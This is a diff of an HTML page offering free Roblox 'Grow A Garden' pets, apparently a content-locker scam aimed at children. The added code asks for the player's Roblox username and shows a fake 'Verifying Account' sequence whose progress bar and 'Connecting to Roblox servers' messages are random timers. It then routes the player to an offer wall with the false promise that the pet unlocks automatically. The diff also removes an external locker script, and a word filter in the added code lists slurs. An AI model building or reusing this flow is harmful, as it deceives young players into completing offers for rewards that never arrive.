@@ -3,12 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Pet Locker - Claim Your Rewards</title>
-
-    <script type="text/javascript">
-        var fRBFw_fyD_rUohlc={"it":4521926,"key":"089f7"};
-    </script>
-    <script src="https://dlk457skl57zp.cloudfront.net/4e120c2.js"></script>
+    <title>Grow A Garden - Claim Your Rewards</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Fredoka+One:wght@400&family=Comic+Neue:wght@400;700&display=swap');
 
@@ -219,167 +214,6 @@
             box-shadow: 0 2px 0 #c44569, 0 2px 8px rgba(0,0,0,0.3);
         }
 
-        .modal {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 1000;
-            animation: fadeIn 0.3s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .modal-content {
-            background: linear-gradient(180deg, #98d952 0%, #87c441 30%, #8B4513 30%, #654321 100%);
-            border: 8px solid #4a2e1f;
-            border-radius: 25px;
-            width: 90%;
-            max-width: 500px;
-            box-shadow: 0 0 60px rgba(0,0,0,0.8);
-            animation: modalSlideIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            overflow: hidden;
-        }
-
-        @keyframes modalSlideIn {
-            from { transform: scale(0.7) translateY(-100px); opacity: 0; }
-            to { transform: scale(1) translateY(0); opacity: 1; }
-        }
-
-        .modal-header {
-            background: linear-gradient(180deg, #98d952 0%, #87c441 100%);
-            padding: 25px;
-            text-align: center;
-            border-bottom: 6px solid #4a2e1f;
-        }
-
-        .modal-title {
-            font-family: 'Fredoka One', cursive;
-            font-size: 2.2rem;
-            color: white;
-            text-shadow: 3px 3px 0 #4a2e1f;
-            margin-bottom: 10px;
-        }
-
-        .modal-body {
-            padding: 30px;
-            background: linear-gradient(180deg, #8B4513 0%, #654321 100%);
-            color: white;
-            text-align: center;
-        }
-
-        .modal-pet-image {
-            width: 150px;
-            height: 150px;
-            object-fit: contain;
-            margin: 20px auto;
-            image-rendering: pixelated;
-            filter: drop-shadow(4px 4px 0 rgba(0,0,0,0.4));
-            animation: bounce 2s infinite;
-        }
-
-        @keyframes bounce {
-            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-10px); }
-            60% { transform: translateY(-5px); }
-        }
-
-        .excitement-text {
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin: 20px 0;
-            text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
-            line-height: 1.4;
-        }
-
-        .countdown {
-            font-family: 'Fredoka One', cursive;
-            font-size: 3rem;
-            color: #ff6b6b;
-            text-shadow: 3px 3px 0 rgba(0,0,0,0.6);
-            margin: 20px 0;
-            animation: pulse 1s infinite;
-        }
-
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-            100% { transform: scale(1); }
-        }
-
-        .big-button {
-            background: linear-gradient(135deg, #98d952 0%, #619534 100%);
-            border: 4px solid #4a7326;
-            border-radius: 15px;
-            color: white;
-            font-family: 'Fredoka One', cursive;
-            font-size: 1.5rem;
-            padding: 18px 35px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-shadow: 2px 2px 0 rgba(0,0,0,0.4);
-            box-shadow: 0 6px 0 #4a7326, 0 6px 20px rgba(0,0,0,0.4);
-            margin: 20px 10px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .big-button:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 9px 0 #4a7326, 0 9px 25px rgba(0,0,0,0.5);
-        }
-
-        .big-button:active {
-            transform: translateY(3px);
-            box-shadow: 0 3px 0 #4a7326, 0 3px 10px rgba(0,0,0,0.4);
-        }
-
-        .big-button.cancel {
-            background: linear-gradient(135deg, #ce6f6a 0%, #b85450 100%);
-            border-color: #8b3a36;
-            box-shadow: 0 6px 0 #8b3a36, 0 6px 20px rgba(0,0,0,0.4);
-        }
-
-        .big-button.cancel:hover {
-            box-shadow: 0 9px 0 #8b3a36, 0 9px 25px rgba(0,0,0,0.5);
-        }
-
-        .big-button.cancel:active {
-            box-shadow: 0 3px 0 #8b3a36, 0 3px 10px rgba(0,0,0,0.4);
-        }
-
-        .close-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: #ce6f6a;
-            border: 3px solid #8b3a36;
-            border-radius: 50%;
-            width: 35px;
-            height: 35px;
-            color: white;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: bold;
-            font-size: 1.2rem;
-            transition: all 0.3s ease;
-        }
-
-        .close-btn:hover {
-            background: #b85450;
-            transform: scale(1.1);
-        }
-
         .sparkles {
             position: absolute;
             width: 100%;
@@ -404,219 +238,6 @@
             100% { opacity: 0; transform: translateY(0) scale(0); }
         }
 
-        .username-input {
-            width: 80%;
-            padding: 15px;
-            border: 3px solid #4a7326;
-            border-radius: 10px;
-            font-size: 1.2rem;
-            font-family: 'Comic Neue', cursive;
-            margin: 20px 0;
-            text-align: center;
-            background: rgba(255,255,255,0.9);
-            box-shadow: inset 0 2px 5px rgba(0,0,0,0.1);
-        }
-
-        .username-input:focus {
-            outline: none;
-            border-color: #98d952;
-            box-shadow: 0 0 10px rgba(152,217,82,0.5);
-        }
-
-        .error-text {
-            color: #ff6b6b;
-            font-weight: 700;
-            text-shadow: 1px 1px 0 rgba(0,0,0,0.5);
-            margin: 10px 0;
-        }
-
-        .loading-container {
-            margin: 30px 0;
-        }
-
-        .loading-bar {
-            background: rgba(0,0,0,0.3);
-            height: 25px;
-            border-radius: 15px;
-            overflow: hidden;
-            margin-bottom: 15px;
-            border: 2px solid #4a7326;
-        }
-
-        .loading-fill {
-            background: linear-gradient(90deg, #98d952 0%, #619534 50%, #87c441 100%);
-            height: 100%;
-            width: 0%;
-            transition: width 0.5s ease;
-            position: relative;
-        }
-
-        .loading-fill::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: repeating-linear-gradient(
-                90deg,
-                transparent 0px,
-                transparent 15px,
-                rgba(255,255,255,0.2) 15px,
-                rgba(255,255,255,0.2) 30px
-            );
-            animation: loadingShimmer 1.5s infinite linear;
-        }
-
-        @keyframes loadingShimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        .offer-notice {
-            background: rgba(255,107,107,0.1);
-            border: 2px solid #ff6b6b;
-            border-radius: 10px;
-            padding: 15px;
-            margin: 20px 0;
-        }
-
-        .offer-notice p {
-            margin: 0;
-            color: #fff;
-            font-weight: 700;
-            text-shadow: 1px 1px 0 rgba(0,0,0,0.5);
-        }
-
-        /* Content Locker Styling */
-        .center1 {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 2000;
-            animation: fadeIn 0.3s ease;
-        }
-
-        .center2 {
-            width: 90%;
-            max-width: 600px;
-            background: linear-gradient(180deg, #98d952 0%, #87c441 30%, #8B4513 30%, #654321 100%);
-            border: 8px solid #4a2e1f;
-            border-radius: 25px;
-            box-shadow: 0 0 60px rgba(0,0,0,0.8);
-            animation: modalSlideIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            overflow: hidden;
-        }
-
-        .center3 {
-            padding: 0;
-        }
-
-        #step1-wrapper {
-            background: linear-gradient(180deg, #98d952 0%, #87c441 100%);
-            padding: 30px;
-            text-align: center;
-            border-bottom: 6px solid #4a2e1f;
-        }
-
-        #step1-wrapper::before {
-            content: '🔒 Content Locker';
-            display: block;
-            font-family: 'Fredoka One', cursive;
-            font-size: 2.2rem;
-            color: white;
-            text-shadow: 3px 3px 0 #4a2e1f;
-            margin-bottom: 15px;
-        }
-
-        #step1-wrapper::after {
-            content: 'Complete a quick verification to unlock your reward!';
-            display: block;
-            font-size: 1.2rem;
-            color: white;
-            font-weight: 700;
-            text-shadow: 2px 2px 0 #4a2e1f;
-            margin-bottom: 20px;
-        }
-
-        .continue-button {
-            background: linear-gradient(135deg, #98d952 0%, #619534 100%) !important;
-            border: 4px solid #4a7326 !important;
-            border-radius: 15px !important;
-            color: white !important;
-            font-family: 'Fredoka One', cursive !important;
-            font-size: 1.5rem !important;
-            padding: 18px 35px !important;
-            cursor: pointer !important;
-            transition: all 0.3s ease !important;
-            text-shadow: 2px 2px 0 rgba(0,0,0,0.4) !important;
-            box-shadow: 0 6px 0 #4a7326, 0 6px 20px rgba(0,0,0,0.4) !important;
-            text-transform: uppercase !important;
-            letter-spacing: 1px !important;
-            text-decoration: none !important;
-            display: inline-block !important;
-        }
-
-        .continue-button:hover {
-            transform: translateY(-3px) !important;
-            box-shadow: 0 9px 0 #4a7326, 0 9px 25px rgba(0,0,0,0.5) !important;
-            background: linear-gradient(135deg, #87c441 0%, #619534 100%) !important;
-        }
-
-        .continue-button:active {
-            transform: translateY(3px) !important;
-            box-shadow: 0 3px 0 #4a7326, 0 3px 10px rgba(0,0,0,0.4) !important;
-        }
-
-        #step2-wrapper {
-            background: linear-gradient(180deg, #8B4513 0%, #654321 100%);
-            padding: 30px;
-            text-align: center;
-            color: white;
-        }
-
-        #step2-wrapper::before {
-            content: '⚡ Choose an offer to continue:';
-            display: block;
-            font-size: 1.3rem;
-            font-weight: 700;
-            margin-bottom: 20px;
-            text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
-        }
-
-        /* Additional styling for content locker elements */
-        .center1 .locker-title {
-            font-family: 'Fredoka One', cursive !important;
-            font-size: 2.2rem !important;
-            color: white !important;
-            text-shadow: 3px 3px 0 #4a2e1f !important;
-            margin-bottom: 15px !important;
-        }
-
-        .center1 .locker-description {
-            font-size: 1.2rem !important;
-            color: white !important;
-            font-weight: 700 !important;
-            text-shadow: 2px 2px 0 #4a2e1f !important;
-            margin-bottom: 20px !important;
-            font-family: 'Comic Neue', cursive !important;
-        }
-
-        /* Override any default button styles */
-        .center1 .btn {
-            all: unset;
-        }
-
-        .center1 .fa {
-            margin-right: 8px;
-        }
-
         @media (max-width: 768px) {
             .title {
                 font-size: 2.2rem;
@@ -633,20 +254,6 @@
             .pet-image {
                 width: 100px;
                 height: 100px;
-            }
-
-            .modal-content {
-                width: 95%;
-            }
-
-            .big-button {
-                font-size: 1.2rem;
-                padding: 15px 25px;
-            }
-
-            .username-input {
-                width: 90%;
-                font-size: 1.1rem;
             }
         }
     </style>
@@ -667,57 +274,7 @@
         </div>
     </div>
 
-    <!-- Modal for excitement building -->
-    <div class="modal" id="modal">
-        <div class="modal-content">
-            <div class="close-btn" onclick="closeModal()">&times;</div>
-            <div class="modal-header">
-                <h2 class="modal-title" id="modalTitle">Amazing Reward Awaits!</h2>
-            </div>
-            <div class="modal-body">
-                <img id="modalPetImage" src="" alt="" class="modal-pet-image">
-                <h3 id="modalPetName" class="excitement-text"></h3>
-
-                <div id="step1" class="step">
-                    <p class="excitement-text">🎉 You're about to unlock an INCREDIBLE reward!</p>
-                    <p class="excitement-text">This rare <span id="petNameSpan"></span> will be yours in just a few seconds!</p>
-                    <button class="big-button" onclick="nextStep()">GET MY REWARD NOW!</button>
-                    <button class="big-button cancel" onclick="closeModal()">Maybe Later</button>
-                </div>
-
-                <div id="step2" class="step" style="display: none;">
-                    <p class="excitement-text">🎮 Enter your Roblox username to continue!</p>
-                    <input type="text" id="usernameInput" placeholder="Enter your username..." class="username-input" maxlength="20">
-                    <p id="usernameError" class="error-text" style="display: none;">Username must be at least 3 characters and appropriate!</p>
-                    <button class="big-button" onclick="validateUsername()">CONTINUE</button>
-                    <button class="big-button cancel" onclick="closeModal()">Cancel</button>
-                </div>
-
-                <div id="step3" class="step" style="display: none;">
-                    <p class="excitement-text">⚡ Preparing your <span id="petNameSpan2"></span>...</p>
-                    <div class="loading-container">
-                        <div class="loading-bar">
-                            <div class="loading-fill" id="loadingFill"></div>
-                        </div>
-                        <p id="loadingText">Connecting to servers...</p>
-                    </div>
-                </div>
-
-                <div id="step4" class="step" style="display: none;">
-                    <p class="excitement-text">🔒 Complete one offer to unlock your reward!</p>
-                    <p class="excitement-text">Hello <span id="displayUsername"></span>! Your <span id="petNameSpan3"></span> is ready to claim!</p>
-                    <div class="offer-notice">
-                        <p>⚠️ Complete 1 offer below to verify you're human and unlock your reward instantly!</p>
-                    </div>
-                    <button class="big-button" onclick="openOfferWall()">COMPLETE OFFER & CLAIM</button>
-                    <button class="big-button cancel" onclick="closeModal()">Cancel</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
     <script>
-
         const rewards = [
             {
                 id: 2,
@@ -746,8 +303,812 @@
         ];
 
         let currentPet = null;
-        let loadingInterval = null;
-        let currentUsername = '';
+
+        // Swear word filter
+        const badWords = ['damn', 'hell', 'crap', 'stupid', 'idiot', 'dumb', 'suck', 'hate', 'kill', 'die', 'noob', 'loser', 'trash', 'garbage', 'scrub', 'ez', 'rekt', 'pwned', 'git gud', 'ur mom', 'kys', 'fag', 'gay', 'retard', 'autistic', 'cancer', 'aids', 'jew', 'nazi', 'terrorist', 'bomb', 'gun', 'shoot', 'murder', 'rape', 'molest', 'pedo', 'sex', 'porn', 'xxx', 'bitch', 'whore', 'slut', 'hoe', 'thot', 'simp', 'virgin', 'chad', 'beta', 'alpha', 'based', 'cringe', 'sus', 'imposter', 'salty', 'toxic', 'weeb', 'furry', 'femboy', 'daddy', 'mommy', 'uwu', 'owo', 'hentai', 'waifu', 'loli', 'shota', 'trap', 'futanari', 'yaoi', 'yuri', 'ecchi', 'lewd', 'thicc', 'booba', 'pp', 'pog', 'poggers', 'pepega', 'kappa', 'jebaited', 'copium', 'hopium', 'sadge', 'malding', 'omega lul', 'lmao', 'lmfao', 'rofl', 'kek', 'normie', 'incel', 'simp lord', 'karen', 'boomer', 'zoomer', 'millennial', 'gen z', 'ok boomer', 'yeet', 'mood', 'vibe check', 'no cap', 'periodt', 'stan', 'ship', 'otp', 'uwu', 'owo', 'rawr', 'nyan', 'baka', 'senpai', 'kouhai', 'onii chan', 'onee san', 'yamete', 'ara ara', 'moe', 'tsundere', 'yandere', 'kuudere', 'dandere', 'deredere'];
+
+        function containsBadWords(text) {
+            const words = text.toLowerCase().split(/\s+/);
+            return words.some(word => badWords.includes(word.replace(/[^a-z]/g, '')));
+        }
+
+        function showUsernameModal(pet) {
+            currentPet = pet;
+
+            const overlay = document.createElement('div');
+            overlay.className = 'username-modal-overlay';
+            overlay.innerHTML = `
+                <div class="username-modal">
+                    <div class="username-modal-header">
+                        <h2>🎮 Enter Your Roblox Username</h2>
+                        <p>Verification required to unlock ${pet.name}</p>
+                        <div class="close-btn" onclick="this.closest('.username-modal-overlay').remove()">&times;</div>
+                    </div>
+                    <div class="username-modal-content">
+                        <div class="pet-preview">
+                            <img src="${pet.image}" alt="${pet.name}" class="preview-pet-image">
+                            <div class="preview-pet-name">${pet.name}</div>
+                        </div>
+                        <div class="username-input-container">
+                            <input type="text" id="usernameInput" placeholder="Enter your Roblox username..." maxlength="20">
+                            <div id="usernameError" class="error-message"></div>
+                        </div>
+                        <button id="continueBtn" class="continue-btn" onclick="validateAndContinue()">
+                            🚀 VERIFY & UNLOCK
+                        </button>
+                    </div>
+                </div>
+            `;
+
+            // Add username modal styles
+            const style = document.createElement('style');
+            style.textContent = `
+                .username-modal-overlay {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background-color: rgba(0,0,0,0.9);
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    z-index: 9999;
+                    animation: fadeIn 0.3s ease;
+                }
+
+                .username-modal {
+                    background: linear-gradient(180deg, #98d952 0%, #87c441 30%, #8B4513 30%, #654321 100%);
+                    width: 90%;
+                    max-width: 500px;
+                    border: 8px solid #4a2e1f;
+                    border-radius: 25px;
+                    overflow: hidden;
+                    position: relative;
+                    box-shadow: 0 0 60px rgba(0,0,0,0.8);
+                    animation: modalSlideIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                }
+
+                .username-modal-header {
+                    background: linear-gradient(180deg, #98d952 0%, #87c441 100%);
+                    padding: 25px;
+                    text-align: center;
+                    border-bottom: 6px solid #4a2e1f;
+                    position: relative;
+                }
+
+                .username-modal-header h2 {
+                    font-family: 'Fredoka One', cursive;
+                    font-size: 1.8rem;
+                    color: white;
+                    text-shadow: 3px 3px 0 #4a2e1f;
+                    margin-bottom: 8px;
+                }
+
+                .username-modal-header p {
+                    font-family: 'Comic Neue', cursive;
+                    font-size: 1.1rem;
+                    color: white;
+                    font-weight: 700;
+                    text-shadow: 2px 2px 0 #4a2e1f;
+                }
+
+                .close-btn {
+                    position: absolute;
+                    top: 15px;
+                    right: 15px;
+                    background: #ce6f6a;
+                    border: 3px solid #8b3a36;
+                    border-radius: 50%;
+                    width: 35px;
+                    height: 35px;
+                    color: white;
+                    cursor: pointer;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    font-weight: bold;
+                    font-size: 1.2rem;
+                    transition: all 0.3s ease;
+                }
+
+                .close-btn:hover {
+                    background: #b85450;
+                    transform: scale(1.1);
+                }
+
+                .username-modal-content {
+                    padding: 30px;
+                    background: linear-gradient(180deg, #8B4513 0%, #654321 100%);
+                    text-align: center;
+                }
+
+                .pet-preview {
+                    margin-bottom: 25px;
+                }
+
+                .preview-pet-image {
+                    width: 80px;
+                    height: 80px;
+                    object-fit: contain;
+                    image-rendering: pixelated;
+                    filter: drop-shadow(3px 3px 0 rgba(0,0,0,0.3));
+                    animation: bounce 2s infinite;
+                }
+
+                .preview-pet-name {
+                    font-family: 'Comic Neue', cursive;
+                    font-size: 1.2rem;
+                    font-weight: 700;
+                    color: white;
+                    text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
+                    margin-top: 10px;
+                }
+
+                .username-input-container {
+                    margin-bottom: 25px;
+                }
+
+                #usernameInput {
+                    width: 100%;
+                    padding: 15px;
+                    font-size: 1.1rem;
+                    font-family: 'Comic Neue', cursive;
+                    font-weight: 700;
+                    border: 4px solid #1a5a5e;
+                    border-radius: 15px;
+                    background: linear-gradient(135deg, #6ee3ef 0%, #35b5ad 100%);
+                    color: white;
+                    text-align: center;
+                    outline: none;
+                    transition: all 0.3s ease;
+                }
+
+                #usernameInput::placeholder {
+                    color: rgba(255,255,255,0.7);
+                }
+
+                #usernameInput:focus {
+                    transform: scale(1.05);
+                    box-shadow: 0 0 20px rgba(110, 227, 239, 0.5);
+                }
+
+                .error-message {
+                    color: #ff6b6b;
+                    font-family: 'Comic Neue', cursive;
+                    font-weight: 700;
+                    font-size: 0.9rem;
+                    margin-top: 10px;
+                    text-shadow: 1px 1px 0 rgba(0,0,0,0.5);
+                    min-height: 20px;
+                }
+
+                .continue-btn {
+                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
+                    border: 4px solid #c44569;
+                    border-radius: 15px;
+                    color: white;
+                    font-family: 'Comic Neue', cursive;
+                    font-weight: 700;
+                    font-size: 1.2rem;
+                    padding: 15px 30px;
+                    cursor: pointer;
+                    transition: all 0.3s ease;
+                    text-shadow: 2px 2px 0 rgba(0,0,0,0.3);
+                    box-shadow: 0 6px 0 #c44569, 0 6px 20px rgba(0,0,0,0.3);
+                    text-transform: uppercase;
+                    letter-spacing: 1px;
+                    width: 100%;
+                }
+
+                .continue-btn:hover {
+                    transform: translateY(-3px);
+                    box-shadow: 0 9px 0 #c44569, 0 9px 25px rgba(0,0,0,0.4);
+                    background: linear-gradient(135deg, #ff7979 0%, #ff6b6b 100%);
+                }
+
+                .continue-btn:active {
+                    transform: translateY(3px);
+                    box-shadow: 0 3px 0 #c44569, 0 3px 10px rgba(0,0,0,0.3);
+                }
+
+                @keyframes bounce {
+                    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+                    40% { transform: translateY(-10px); }
+                    60% { transform: translateY(-5px); }
+                }
+
+                @keyframes fadeIn {
+                    from { opacity: 0; }
+                    to { opacity: 1; }
+                }
+
+                @keyframes modalSlideIn {
+                    from { transform: translateY(-100px) scale(0.8); opacity: 0; }
+                    to { transform: translateY(0) scale(1); opacity: 1; }
+                }
+            `;
+
+            document.head.appendChild(style);
+            document.body.appendChild(overlay);
+
+            // Focus on input
+            setTimeout(() => {
+                document.getElementById('usernameInput').focus();
+            }, 500);
+
+            // Enter key support
+            document.getElementById('usernameInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    validateAndContinue();
+                }
+            });
+
+            // ESC key to close
+            const handleEsc = (e) => {
+                if (e.key === 'Escape') {
+                    overlay.remove();
+                    document.removeEventListener('keydown', handleEsc);
+                }
+            };
+            document.addEventListener('keydown', handleEsc);
+        }
+
+        function validateAndContinue() {
+            const username = document.getElementById('usernameInput').value.trim();
+            const errorDiv = document.getElementById('usernameError');
+
+            if (!username) {
+                errorDiv.textContent = '⚠️ Please enter your Roblox username';
+                document.getElementById('usernameInput').style.border = '4px solid #ff6b6b';
+                return;
+            }
+
+            if (username.length < 3) {
+                errorDiv.textContent = '⚠️ Username must be at least 3 characters';
+                document.getElementById('usernameInput').style.border = '4px solid #ff6b6b';
+                return;
+            }
+
+            if (containsBadWords(username)) {
+                errorDiv.textContent = '⚠️ Username contains inappropriate language';
+                document.getElementById('usernameInput').style.border = '4px solid #ff6b6b';
+                return;
+            }
+
+            // Clear error and show loading
+            errorDiv.textContent = '';
+            document.getElementById('usernameInput').style.border = '4px solid #1a5a5e';
+            document.querySelector('.username-modal-overlay').remove();
+            showLoadingSequence(username);
+        }
+
+        function showLoadingSequence(username) {
+            const overlay = document.createElement('div');
+            overlay.className = 'loading-modal-overlay';
+            overlay.innerHTML = `
+                <div class="loading-modal">
+                    <div class="loading-modal-header">
+                        <h2>🔍 Verifying Account</h2>
+                        <p>Checking ${username} for eligibility...</p>
+                    </div>
+                    <div class="loading-modal-content">
+                        <div class="pet-preview">
+                            <img src="${currentPet.image}" alt="${currentPet.name}" class="loading-pet-image">
+                            <div class="loading-pet-name">${currentPet.name}</div>
+                        </div>
+                        <div class="loading-container">
+                            <div class="progress-bar">
+                                <div class="progress-fill" id="progressFill"></div>
+                            </div>
+                            <div class="progress-text" id="progressText">Initializing verification...</div>
+                            <div class="loading-percentage" id="loadingPercentage">0%</div>
+                        </div>
+                    </div>
+                </div>
+            `;
+
+            // Add loading modal styles
+            const style = document.createElement('style');
+            style.textContent = `
+                .loading-modal-overlay {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background-color: rgba(0,0,0,0.9);
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    z-index: 9999;
+                    animation: fadeIn 0.3s ease;
+                }
+
+                .loading-modal {
+                    background: linear-gradient(180deg, #98d952 0%, #87c441 30%, #8B4513 30%, #654321 100%);
+                    width: 90%;
+                    max-width: 500px;
+                    border: 8px solid #4a2e1f;
+                    border-radius: 25px;
+                    overflow: hidden;
+                    position: relative;
+                    box-shadow: 0 0 60px rgba(0,0,0,0.8);
+                    animation: modalSlideIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                }
+
+                .loading-modal-header {
+                    background: linear-gradient(180deg, #98d952 0%, #87c441 100%);
+                    padding: 25px;
+                    text-align: center;
+                    border-bottom: 6px solid #4a2e1f;
+                }
+
+                .loading-modal-header h2 {
+                    font-family: 'Fredoka One', cursive;
+                    font-size: 1.8rem;
+                    color: white;
+                    text-shadow: 3px 3px 0 #4a2e1f;
+                    margin-bottom: 8px;
+                }
+
+                .loading-modal-header p {
+                    font-family: 'Comic Neue', cursive;
+                    font-size: 1.1rem;
+                    color: white;
+                    font-weight: 700;
+                    text-shadow: 2px 2px 0 #4a2e1f;
+                }
+
+                .loading-modal-content {
+                    padding: 30px;
+                    background: linear-gradient(180deg, #8B4513 0%, #654321 100%);
+                    text-align: center;
+                }
+
+                .loading-pet-image {
+                    width: 80px;
+                    height: 80px;
+                    object-fit: contain;
+                    image-rendering: pixelated;
+                    filter: drop-shadow(3px 3px 0 rgba(0,0,0,0.3));
+                    animation: spin 2s linear infinite;
+                }
+
+                .loading-pet-name {
+                    font-family: 'Comic Neue', cursive;
+                    font-size: 1.2rem;
+                    font-weight: 700;
+                    color: white;
+                    text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
+                    margin-top: 10px;
+                    margin-bottom: 25px;
+                }
+
+                .loading-container {
+                    margin-top: 25px;
+                }
+
+                .progress-bar {
+                    width: 100%;
+                    height: 20px;
+                    background: rgba(0,0,0,0.3);
+                    border: 3px solid #1a5a5e;
+                    border-radius: 15px;
+                    overflow: hidden;
+                    margin-bottom: 15px;
+                    position: relative;
+                }
+
+                .progress-fill {
+                    height: 100%;
+                    background: linear-gradient(90deg, #6ee3ef 0%, #35b5ad 50%, #6ee3ef 100%);
+                    width: 0%;
+                    transition: width 0.3s ease;
+                    background-size: 200% 100%;
+                    animation: shimmer 2s infinite;
+                }
+
+                .progress-text {
+                    font-family: 'Comic Neue', cursive;
+                    font-size: 1rem;
+                    font-weight: 700;
+                    color: white;
+                    text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
+                    margin-bottom: 10px;
+                }
+
+                .loading-percentage {
+                    font-family: 'Fredoka One', cursive;
+                    font-size: 1.5rem;
+                    color: #6ee3ef;
+                    text-shadow: 2px 2px 0 rgba(0,0,0,0.5);
+                }
+
+                @keyframes spin {
+                    from { transform: rotate(0deg); }
+                    to { transform: rotate(360deg); }
+                }
+
+                @keyframes shimmer {
+                    0% { background-position: -200% 0; }
+                    100% { background-position: 200% 0; }
+                }
+            `;
+
+            document.head.appendChild(style);
+            document.body.appendChild(overlay);
+
+            // Loading sequence
+            const messages = [
+                'Initializing verification...',
+                'Connecting to Roblox servers...',
+                'Validating account status...',
+                'Checking game permissions...',
+                'Verifying eligibility...',
+                'Preparing reward unlock...',
+                'Almost ready...',
+                'Verification complete!'
+            ];
+
+            let progress = 0;
+            let messageIndex = 0;
+
+            const loadingInterval = setInterval(() => {
+                progress += Math.random() * 15 + 5;
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(loadingInterval);
+
+                    setTimeout(() => {
+                        overlay.remove();
+                        showTapRainOffers(currentPet);
+                    }, 1000);
+                }
+
+                document.getElementById('progressFill').style.width = progress + '%';
+                document.getElementById('loadingPercentage').textContent = Math.floor(progress) + '%';
+
+                if (progress > (messageIndex + 1) * 12.5 && messageIndex < messages.length - 1) {
+                    messageIndex++;
+                    document.getElementById('progressText').textContent = messages[messageIndex];
+                }
+            }, 400);
+        }
+
+        function showTapRainOffers(pet) {
+            currentPet = pet;
+
+            const overlay = document.createElement('div');
+            overlay.className = 'tap-rain-modal-overlay';
+            overlay.style.display = 'flex';
+            overlay.style.backgroundColor = 'rgba(0,0,0,0.9)';
+
+            const modal = document.createElement('div');
+            modal.className = 'tap-rain-modal';
+
+            const contentContainer = document.createElement('div');
+            contentContainer.className = 'tap-rain-modal-content';
+
+            // Add custom header with Minecraft styling
+            const header = document.createElement('div');
+            header.className = 'minecraft-locker-header';
+            header.innerHTML = `
+                <div class="locker-title">🔒 Complete Your Quest</div>
+                <div class="locker-subtitle">Choose any offer below to unlock your ${pet.name}!</div>
+                <div class="close-btn-locker" onclick="this.closest('.tap-rain-modal-overlay').remove()">&times;</div>
+            `;
+
+            contentContainer.appendChild(header);
+
+            const offersGrid = document.createElement('div');
+            offersGrid.className = 'offers-grid minecraft-offers';
+            offersGrid.innerHTML = '<div id="offerContainer" class="grid"></div>';
+            contentContainer.appendChild(offersGrid);
+
+            // Add footer with motivation
+            const footer = document.createElement('div');
+            footer.className = 'minecraft-locker-footer';
+            footer.innerHTML = `
+                <div class="footer-text">Pet reward unlocked <strong>automatically</strong> upon offer completion. Offers for your region typically take 2-3 minutes to complete.</div>
+            `;
+            contentContainer.appendChild(footer);
+
+            const style = document.createElement('style');
+            style.textContent = `
+                .tap-rain-modal-overlay {
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background-color: rgba(0,0,0,0.9);
+                    opacity: 1;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    z-index: 9999;
+                    animation: fadeIn 0.3s ease;
+                }
+
+                .tap-rain-modal {
+                    background: linear-gradient(180deg, #98d952 0%, #87c441 30%, #8B4513 30%, #654321 100%);
+                    width: 90%;
+                    max-width: 800px;
+                    max-height: 90vh;
+                    border: 8px solid #4a2e1f;
+                    border-radius: 25px;
+                    overflow: hidden;
+                    position: relative;
+                    box-shadow: 0 0 60px rgba(0,0,0,0.8);
+                    animation: modalSlideIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+                }
+
+                .minecraft-locker-header {
+                    background: linear-gradient(180deg, #98d952 0%, #87c441 100%);
+                    padding: 25px;
+                    text-align: center;
+                    border-bottom: 6px solid #4a2e1f;
+                    position: relative;
+                }
+
+                .minecraft-locker-header::before {
+                    content: '';
+                    position: absolute;
+                    top: 0;
+                    left: 0;
+                    right: 0;
+                    height: 12px;
+                    background: repeating-linear-gradient(
+                        90deg,
+                        #98d952 0px,
+                        #98d952 20px,
+                        #87c441 20px,
+                        #87c441 40px
+                    );
+                    border-bottom: 2px solid #619534;
+                }
+
+                .locker-title {
+                    font-family: 'Fredoka One', cursive;
+                    font-size: 2.2rem;
+                    color: white;
+                    text-shadow: 3px 3px 0 #4a2e1f;
+                    margin-bottom: 10px;
+                }
+
+                .locker-subtitle {
+                    font-family: 'Comic Neue', cursive;
